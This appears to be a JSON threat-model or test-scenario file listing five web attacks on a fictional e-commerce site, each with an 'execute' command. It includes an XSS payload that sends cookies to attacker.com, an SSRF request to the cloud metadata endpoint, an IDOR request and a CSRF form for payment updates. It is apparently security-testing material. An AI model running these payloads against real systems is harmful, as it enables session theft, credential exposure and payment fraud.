[
  {
    "title": "Cross-Site Scripting on Profile Page",
    "description": "An attacker injectS malicious JavaScript into a customer profile field, which executes in the browser of an administrator viewing the profile.",
    "execute": "curl -X POST -d 'username=test&bio=<script>fetch(\"https://attacker.com/log?cookie=\"+document.cookie);</script>' https://northwind.com/api/user/update"
  },
  {
    "title": "Insecure Direct Object Reference (IDOR)",
    "description": "An attacker manipulates a parameter in the API call for viewing order details to access payment tokens belonging to other customers.",
    "execute": "curl -H \"Authorization: Bearer <attacker_token>\" https://northwind.com/api/orders/view/order_id=9999"
  },
  {
    "title": "Server-Side Request Forgery (SSRF)",
    "description": "The system fetches an external image URL provided by a user, allowing the attacker to force the server to make requests to internal metadata endpoints.",
    "execute": "curl -X POST -d 'image_url=http://169.254.169.254/latest/meta-data/' https://northwind.com/api/products/update"
  },
  {
    "title": "Sensitive Data Exposure via Misconfigured Logs",
    "description": "The application inadvertently logs full request bodies, including card tokens or PII, to an accessible log file on the web server.",
    "execute": "curl -X POST -d 'card_token=tok_12345&name=Attacker' https://northwind.com/checkout/process"
  },
  {
    "title": "Cross-Site Request Forgery (CSRF) on Payment Update",
    "description": "An attacker tricks an authenticated staff member into visiting a page that silently submits a request to update a stored payment method.",
    "execute": "<form action=\"https://northwind.com/admin/payment/update\" method=\"POST\"><input type=\"hidden\" name=\"token\" value=\"tok_attacker\"></form>"
  }
]
```

